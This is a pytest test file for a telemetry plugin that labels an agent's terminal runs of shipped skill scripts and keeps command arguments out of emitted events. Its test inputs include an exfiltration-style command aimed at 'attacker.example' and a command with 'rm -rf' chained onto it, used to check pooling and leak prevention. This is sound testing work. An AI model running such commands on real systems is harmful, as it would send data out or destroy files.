"""B-169b: a `terminal` run of a shipped skill's script is labelled on its `tool.call`.

`target_system` = "skill" and `operation` = the shipped skill's name (data#608
keys the family `skill.<operation>` and pools unknowns as `skill.other`), and
nothing else of the command leaves. The EdgeOS script keeps the labels ov#437
gave it. The recipes are read from the skills themselves, so a recipe that
changes shape fails here rather than going quiet on the fleet.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[3]
SKILLS = REPO / "skills"
SESSION = "sess-skill"
RUNNER = re.compile(r"^(?:bun|python3|node) skills/")
EDGEOS_SUBSTITUTIONS = {
    "{event_id}": "5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a",
    "{occurrence_iso}": "2026-10-20T10:00:00Z",
    "{current_iso_timestamp}": "2026-10-11T00:00:00Z",
    "{start_iso}": "2026-10-11T00:00:00Z",
    "{end_iso}": "2026-10-12T00:00:00Z",
}
EDGEOS_SCRIPT = "skills/edgeos/scripts/edgeos.ts"
#: Skills whose SKILL.md carries a script recipe today (a floor: the reader
#: below must keep finding at least these).
SKILLS_WITH_RECIPES = {"agent-commons", "agent-plaza", "agent-profile", "edge-india", "edgeos", "token-usage-audit"}


@pytest.fixture()
def labeller(plugin):
    return __import__(f"{plugin.__name__}._skill_label", fromlist=["_skill_label"])


@pytest.fixture()
def live(plugin, ctx, monkeypatch):
    monkeypatch.setenv("AV_EVENTS_TOKEN", "test-token")
    plugin.register(ctx)
    ctx.fire("on_session_start", session_id=SESSION, model="m", platform="telegram")
    return plugin


def fire(ctx, command=None, *, tool_name="terminal", args=None, call_id="call-1"):
    ctx.fire(
        "post_tool_call",
        session_id=SESSION,
        task_id="task-1",
        turn_id="turn-1",
        tool_name=tool_name,
        args={"command": command} if args is None else args,
        result='{"ok": true}',
        tool_call_id=call_id,
        api_request_id="req-1",
        duration_ms=120,
        status="ok",
        error_type=None,
        error_message=None,
    )


def tool_calls(av, plugin):
    return [e for e in av.read_buffer(plugin._COLLECTOR) if e["event_type"] == "tool.call"]


def label_of(ctx, av, plugin, command, **kw):
    before = len(tool_calls(av, plugin))
    fire(ctx, command, call_id=f"call-{before + 1}", **kw)
    events = tool_calls(av, plugin)
    assert len(events) == before + 1
    payload = events[-1]["payload"]
    return payload["target_system"], payload["operation"]


def fenced_recipes(path: Path) -> list[str]:
    """Every script run in the fenced blocks of one markdown file, verbatim:
    indentation removed, backslash continuations kept as the agent copies them."""
    text = path.read_text(encoding="utf-8")
    out: list[str] = []
    for block in re.findall(r"^[ \t]*```[A-Za-z]*\n(.*?)^[ \t]*```", text, re.S | re.M):
        current: list[str] = []
        for raw in block.splitlines():
            line = raw.strip()
            if current:
                current.append(line)
            elif RUNNER.match(line):
                current = [line]
            else:
                continue
            if not line.endswith("\\"):
                out.append("\n".join(current))
                current = []
    return out


def all_recipes() -> list[tuple[str, str]]:
    found = []
    for skill_md in sorted(SKILLS.glob("*/SKILL.md")):
        for command in fenced_recipes(skill_md):
            found.append((skill_md.parent.name, command))
    return found


def path_skill(command: str) -> str:
    """The skill directory the command's script lives in, read independently."""
    return command.split()[1].split("/")[1]


def fill(command: str) -> str:
    for placeholder, value in EDGEOS_SUBSTITUTIONS.items():
        command = command.replace(placeholder, value)
    return command


# --------------------------------------------------------------------------
# The shipped list is the installer's
# --------------------------------------------------------------------------


def test_shipped_skills_are_exactly_the_installers_edge_skill_names(labeller):
    text = (REPO / "install" / "paths.ts").read_text(encoding="utf-8")
    body = re.search(r"export const EDGE_SKILL_NAMES = \[(.*?)\] as const;", text, re.S).group(1)
    body = "\n".join(line for line in body.splitlines() if not line.strip().startswith("//"))
    names = set(re.findall(r'"([^"]+)"', body))
    assert names and labeller.SHIPPED_SKILLS == names
    assert not (labeller.SEPARATELY_INSTALLED_SKILLS & names)
    for name in labeller.SEPARATELY_INSTALLED_SKILLS:
        assert (REPO / "skills" / name / "scripts").is_dir(), name
    names = names | labeller.SEPARATELY_INSTALLED_SKILLS
    assert labeller.LABELLED_SKILLS == names
    # Every labelled name is also a valid operation token, so none is pooled.
    assert all(re.fullmatch(r"[a-z][a-z0-9_.-]{0,63}", name) for name in names)


def test_the_tokens_are_the_ones_data_keys_on(labeller):
    assert labeller.TARGET_SYSTEM == "skill"
    assert labeller.OTHER_OPERATION == "other"


# --------------------------------------------------------------------------
# Every shipped recipe, as the skills write it
# --------------------------------------------------------------------------


def test_the_recipe_reader_finds_every_skill_that_has_a_script_recipe():
    skills = {path_skill(command) for _, command in all_recipes()}
    assert SKILLS_WITH_RECIPES <= skills, skills


def test_every_skill_md_recipe_is_labelled_with_its_scripts_skill(live, ctx, av):
    seen = 0
    for skill, command in all_recipes():
        command = fill(command)
        target, operation = label_of(ctx, av, live, command)
        if command.startswith(f"bun {EDGEOS_SCRIPT} "):
            # ov#437: the EdgeOS script's verbs keep their own family.
            assert target == "edgeos" and operation.startswith("edgeos."), (skill, command, operation)
        else:
            assert (target, operation) == ("skill", path_skill(command)), (skill, command)
        seen += 1
    assert seen >= 20


@pytest.mark.parametrize(
    ("command", "operation"),
    [
        ("python3 skills/agent-commons/scripts/search_forum.py \\\n  --surface agent_commons \\\n"
         '  --query "memory should know when to forget"', "agent-commons"),
        ('python3 skills/agent-plaza/scripts/agent_plaza_selfie.py \\\n  --root "$HERMES_HOME" \\\n'
         "  --cooldown-hours 0", "agent-plaza"),
        ("bun skills/agent-profile/scripts/profile.ts", "agent-profile"),
        ("bun skills/edge-india/scripts/refs.ts search housing riva", "edge-india"),
        ("python3 skills/token-usage-audit/scripts/audit_token_usage.py --json-only", "token-usage-audit"),
        ("bun skills/edgeos/scripts/events.ts --when today", "edgeos"),
        ('bun skills/edgeos/scripts/directory.ts --search "Priya"', "edgeos"),
        ("bun skills/edgeos/scripts/profile.ts --json", "edgeos"),
        # Installed by their own steps: own keys (data L17038).
        ("bun skills/recall/scripts/recall.ts rebuild", "recall"),
        ("python3 skills/approval/scripts/live_selfcheck.py", "approval"),
        # simocracy's recipe runs agent-commons' script: labelled by the script's skill,
        # so a Simocracy block pages as skill.agent-commons (data L17038, for the runbook).
        ("python3 skills/agent-commons/scripts/search_forum.py \\\n  --surface simocracy_proposals \\\n"
         '  --query "grant budget"', "agent-commons"),
        # index-network's tools.md and the workspace AGENTS.md gates.
        ('bun skills/index-network/scripts/pause-job.ts pause --label "Daily brief"', "index-network"),
        ("bun skills/index-network/scripts/welcome.ts", "index-network"),
        ("node skills/index-network/scripts/welcome.ts", "index-network"),
        ("  bun skills/agent-profile/scripts/profile.ts\n", "agent-profile"),
    ],
)
def test_named_recipes_are_labelled(live, ctx, av, command, operation):
    assert label_of(ctx, av, live, command) == ("skill", operation)


def test_inline_recipes_outside_skill_md_are_labelled(live, ctx, av):
    """The inline runs in index-network's tools.md and the workspace AGENTS.md."""
    texts = [(SKILLS / "index-network" / "tools.md").read_text(encoding="utf-8"),
             (REPO / "workspace" / "AGENTS.md").read_text(encoding="utf-8")]
    inline = {c for text in texts for c in re.findall(r"`((?:bun|python3|node) skills/[^`]+)`", text)}
    assert {path_skill(c) for c in inline} >= {"index-network", "agent-profile"}
    for command in sorted(inline):
        assert label_of(ctx, av, live, command) == ("skill", path_skill(command)), command


# --------------------------------------------------------------------------
# Unshipped and malformed names pool as `other`
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "bun skills/evil-skill/scripts/x.ts",
        "python3 skills/my-own-skill/scripts/run.py --flag",
        # Retired from the installer (RETIRED_SKILL_DIRS).
        "bun skills/geo-esmeralda/scripts/geo.ts",
        "bun skills/../scripts/x.ts",
    ],
)
def test_an_unshipped_name_is_other(live, ctx, av, command):
    assert label_of(ctx, av, live, command) == ("skill", "other")


@pytest.mark.parametrize(
    "name",
    ["Agent-Commons", "agent commons!", "agent_commons!", "a" * 65, "édgeos", "agent-commons:x", "AGENT-PROFILE"],
)
def test_a_name_failing_the_token_rule_is_other(live, ctx, av, name):
    command = f"bun skills/{name}/scripts/x.ts"
    if " " in name:
        # A space ends the path: not a script run at all.
        assert label_of(ctx, av, live, command) == (None, None)
    else:
        assert label_of(ctx, av, live, command) == ("skill", "other")


# --------------------------------------------------------------------------
# Nothing else of the command leaves
# --------------------------------------------------------------------------


@pytest.mark.parametrize("mode", ["metadata", "sanitized", "full"])
def test_arguments_paths_and_file_names_never_leave(plugin, ctx, monkeypatch, av, mode):
    monkeypatch.setenv("AV_EVENTS_TOKEN", "test-token")
    monkeypatch.setenv("AV_CAPTURE", mode)
    plugin.register(ctx)
    ctx.fire("on_session_start", session_id=SESSION, model="m", platform="telegram")
    commands = [
        "python3 skills/agent-commons/scripts/search_forum.py --surface agent_commons "
        '--query "alice remembers the whiteboard"',
        'bun skills/edge-india/scripts/refs.ts read newsletter/housing-secret.md --section zanzibar',
        "bun skills/evil-skill/scripts/exfil-alice.ts --to attacker.example",
        "bun skills/Agent-Commons/scripts/alice-notes.py",
    ]
    for i, command in enumerate(commands):
        fire(ctx, command, call_id=f"c{i}")
    events = tool_calls(av, plugin)
    assert [(e["payload"]["target_system"], e["payload"]["operation"]) for e in events] == [
        ("skill", "agent-commons"), ("skill", "edge-india"), ("skill", "other"), ("skill", "other"),
    ]
    blob = json.dumps(av.read_buffer(plugin._COLLECTOR))
    for leak in ("skills/", "scripts", "search_forum", "refs.ts", ".py", ".ts", "--", "alice", "whiteboard",
                 "housing", "zanzibar", "evil", "exfil", "attacker", "Agent-Commons", "newsletter"):
        assert leak not in blob, (mode, leak)


def test_no_new_field_on_tool_call(plugin, ctx, monkeypatch, av):
    monkeypatch.setenv("AV_EVENTS_TOKEN", "test-token")
    monkeypatch.setenv("AV_CAPTURE", "full")
    plugin.register(ctx)
    fire(ctx, "bun skills/agent-profile/scripts/profile.ts")
    payload = tool_calls(av, plugin)[0]["payload"]
    assert set(payload) == {
        "tool_name", "tool_category", "args_hash", "result_hash", "ok", "status", "latency_ms", "receipt",
        "error_type", "operation", "target_system", "category_version", "args_length", "result_length",
    }
    assert (payload["target_system"], payload["operation"]) == ("skill", "agent-profile")


# --------------------------------------------------------------------------
# Only the first word sequence counts
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "cd ~ && bun skills/agent-profile/scripts/profile.ts",
        "cd /tmp && python3 skills/agent-commons/scripts/search_forum.py --query x",
        "echo hi; bun skills/agent-profile/scripts/profile.ts",
        "cat skills/agent-profile/scripts/profile.ts",
        "ls skills/edgeos/scripts/",
        "FOO=1 bun skills/agent-profile/scripts/profile.ts",
        "sudo python3 skills/agent-commons/scripts/search_forum.py",
        "bun run skills/agent-profile/scripts/profile.ts",
        "bun ./skills/agent-profile/scripts/profile.ts",
        'bun "$HERMES_HOME"/skills/agent-profile/scripts/profile.ts',
        "bun ~/.hermes/skills/agent-profile/scripts/profile.ts",
        "python skills/agent-commons/scripts/search_forum.py",
        "deno skills/agent-profile/scripts/profile.ts",
        "bun skills/agent-profile/scripts/profile.ts;rm -rf /tmp/x",
        "bun skills/agent-profile/scripts/profile.ts|cat",
        "bun skills/agent-profile/scripts/sub/profile.ts",
        "bun skills/agent-profile/profile.ts",
        "bun skills/agent-profile/scripts/",
        "bunx skills/agent-profile/scripts/profile.ts",
        "\nbun skills/agent-profile/scripts/profile.ts",
        "grep -r foo . && bun skills/index-network/scripts/welcome.ts",
    ],
)
def test_skills_anywhere_but_the_first_words_is_not_labelled(live, ctx, av, command):
    assert label_of(ctx, av, live, command) == (None, None)


# --------------------------------------------------------------------------
# Non-terminal tools are untouched
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool_name", "args"),
    [
        ("execute_code", {"code": "import subprocess; subprocess.run(['bun', 'skills/agent-profile/scripts/profile.ts'])"}),
        ("execute_code", {"command": "bun skills/agent-profile/scripts/profile.ts"}),
        ("Terminal", {"command": "bun skills/agent-profile/scripts/profile.ts"}),
        ("process", {"command": "bun skills/agent-profile/scripts/profile.ts"}),
        ("mcp__index__create_intent", {"command": "bun skills/agent-profile/scripts/profile.ts"}),
        ("read_file", {"path": "skills/agent-profile/scripts/profile.ts"}),
    ],
)
def test_non_terminal_tools_are_not_labelled(live, ctx, av, tool_name, args):
    fire(ctx, tool_name=tool_name, args=args)
    payload = tool_calls(av, live)[-1]["payload"]
    assert (payload["target_system"], payload["operation"]) == (None, None)


# --------------------------------------------------------------------------
# EdgeOS keeps ov#437's labels
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "operation"),
    [
        ("bun skills/edgeos/scripts/edgeos.ts list --after 2026-10-11T00:00:00Z", "edgeos.events_list"),
        ("bun skills/edgeos/scripts/edgeos.ts event 5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a", "edgeos.event_read"),
        ("bun skills/edgeos/scripts/edgeos.ts rsvp 5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a", "edgeos.rsvp"),
        ("bun skills/edgeos/scripts/edgeos.ts cancel 5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a", "edgeos.cancel_rsvp"),
        ("bun skills/edgeos/scripts/edgeos.ts participants 5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a",
         "edgeos.participants_list"),
        ("bun skills/edgeos/scripts/edgeos.ts venues --limit 100", "edgeos.venues_list"),
    ],
)
def test_the_edgeos_script_verbs_keep_the_edgeos_label(live, ctx, av, command, operation):
    assert label_of(ctx, av, live, command) == ("edgeos", operation)


@pytest.mark.parametrize(
    ("command", "workdir"),
    [
        ("bun skills/edgeos/scripts/edgeos.ts frobnicate", None),
        ("bun skills/edgeos/scripts/edgeos.ts event not-a-uuid", None),
        ("bun skills/edgeos/scripts/edgeos.ts list --after 2026-10-11T00:00:00Z", "/tmp"),
        ("bun skills/edgeos/scripts/edgeos.ts list --after $(date)", None),
    ],
)
def test_an_edgeos_script_run_the_edgeos_reader_skips_is_still_unlabelled(live, ctx, av, command, workdir):
    """As ov#437 sends it: the skill label never claims the EdgeOS script."""
    args = {"command": command} if workdir is None else {"command": command, "workdir": workdir}
    fire(ctx, args=args)
    payload = tool_calls(av, live)[-1]["payload"]
    assert (payload["target_system"], payload["operation"]) == (None, None)


def test_the_edgeos_curl_label_is_unchanged(live, ctx, av):
    command = 'curl -s -H "Authorization: Bearer eos_test" "https://api.edgeos.world/api/v1/humans/me"'
    assert label_of(ctx, av, live, command) == ("edgeos", "edgeos.profile_read")


# --------------------------------------------------------------------------
# The pure function
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool_name", "args"),
    [
        (None, None),
        ("terminal", None),
        ("terminal", "bun skills/agent-profile/scripts/profile.ts"),
        ("terminal", {"command": None}),
        ("terminal", {"command": ["bun", "skills/agent-profile/scripts/profile.ts"]}),
        ("terminal", {"command": ""}),
        ("terminal", {"command": "bun skills/agent-profile/scripts/profile.ts " + "x" * 20000}),
        (["terminal"], {"command": "bun skills/agent-profile/scripts/profile.ts"}),
    ],
)
def test_skill_label_returns_none_for_anything_else_and_never_raises(labeller, tool_name, args):
    assert labeller.skill_label(tool_name, args) is None


def test_skill_label_reads_only_the_first_words(labeller):
    assert labeller.skill_label("terminal", {"command": "bun skills/agent-profile/scripts/profile.ts"}) == (
        "skill", "agent-profile")
    assert labeller.skill_label("terminal", {"command": "bun skills/edgeos/scripts/edgeos.ts list"}) is None
